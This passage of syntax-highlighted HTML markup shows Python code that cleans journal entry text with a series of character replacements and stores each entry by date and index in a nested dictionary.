entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;{&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;{&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[ *&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;* ]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;*]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;⌗&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;＄&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; --- &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; — &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; -- &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; – &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;...&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;…&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryDate &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;not&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryHeader&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tjournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entryIndex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;][&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;uuid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span 